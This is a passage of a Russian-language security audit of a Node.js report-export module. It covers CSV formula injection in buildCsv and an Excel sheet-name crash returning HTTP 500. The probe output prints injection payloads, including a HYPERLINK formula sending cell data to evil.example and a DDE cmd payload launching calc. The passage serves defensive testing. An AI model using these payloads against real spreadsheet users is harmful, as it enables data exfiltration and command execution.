### 0.3 Экспорт — инъекция формул (цитаты кода)

`export.js:93-113`, `buildCsv`:

```js
const esc = (v) => {
  const s = v === null || v === undefined ? '' : String(v)
  return /[;"\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s
}
const cell = (value, type) => {
  if (value === null || value === undefined || value === '') return ''
  if (NUMERIC.has(type) && typeof value === 'number') return String(value).replace('.', ',')
  return asText(value, type)
}
```

Экранируются только `;`, `"`, переводы строк. Ведущие `=`, `+`, `-`, `@`, `\t`, `\r` не нейтрализуются. Зонд (`probe-export.mjs`) на трёх строках дал такой CSV (BOM опущен):

```
Гость;Примечание;Сумма
"=HYPERLINK(""http://evil.example/?""&C2;""Иванов"")";+cmd|' /C calc'!A0;1234567,5
-1+1;@SUM(A1:A2);-5
"Пётр; ""Кавычки""";обычно;0
Итого;;1234562,5
```

Кавычки вокруг первой ячейки Excel снимает и вычисляет `=HYPERLINK(...)` как формулу. **xlsx безопасен:** `export.js:54-58` `asCell` отдаёт строку, `ws.addRow([...])` (`:151`) пишет её как `ValueType.String` (зонд: `cell A4 type: 3`, `Formula = 6`), формулой в exceljs становится только объект `{ formula }`. Числа в xlsx — числа (`asCell` возвращает `number` для `NUMERIC` типов), `numFmt` по типу (`:155-157`). docx — только текст (`docxCell`, `:186-196`). Подробности — D4-002.

### D4-001 · [Тяжесть 2] Выгрузка в Excel падает с 500 на любом отчёте, в названии которого есть `: / \ ? * [ ]`
- Направление: 4 · Класс: доступность
- Окружение: оба
- Где: `server/src/reports/export.js:123` (`wb.addWorksheet(result.report.title.slice(0, 30), …)`); `node_modules/exceljs/lib/doc/worksheet.js:155-161` (4.4.0: `if (/[*?:/\\[\]]/.test(name)) throw …`; `/(^')|('$)/` — тоже throw; имя `History` — throw); `server/src/controllers/reportController.js:94-116` (`exportFile` → `next(err)`); `middleware/errorHandler.js:42-43` (ошибка без `status` → 500 «Внутренняя ошибка сервера»); `client/src/api/reports.ts:355-365` (`messageFromBlobError` покажет этот текст).
- Что: название отчёта используется как имя листа без очистки. Excel запрещает в имени листа семь символов и апостроф по краям; exceljs бросает обычный `Error`, который движок не переводит в 400. CSV и Word с тем же названием работают, на экране отчёт строится — падает только кнопка «Excel».
- Сценарий (гипотеза): администратор в конструкторе называет отчёт «Долги / переплаты», «Загрузка: по дням» или копию «Выручка: 2026» → «Excel» → тост «Внутренняя ошибка сервера»; в `combined.log` — `Worksheet name … cannot include any of the following characters`. Для встроенных пяти названия чистые, поэтому на демо не всплывёт — всплывёт у первого клиента после первого своего отчёта. Обрезка до 30 символов проверяется **после** — имя длиной 31+ с апострофом в позиции 30 тоже упадёт.
- Проверка: зонд `probe-export.mjs`: `buildXlsx({ report: { title: 'Реестр: гости / долги?' } })` → `Error Worksheet name Реестр: гости / долги? cannot include any of the following characters: * ? : \ / [ ]`. Живьём (напр. 7): создать отчёт с двоеточием в названии → `POST /api/reports/<key>/export {format:'xlsx'}` → 500.
- Последствия: выгрузка одного из трёх форматов недоступна для части пользовательских отчётов, диагноз пользователю не сообщается.
- Уже известно: нет
- Связано с: D4-017 (имя файла), D9 (нет тестов на `export.js`)
- Уверенность: подтверждено (зонд)

## 6. Вопросы владельцу (тяжесть 4)
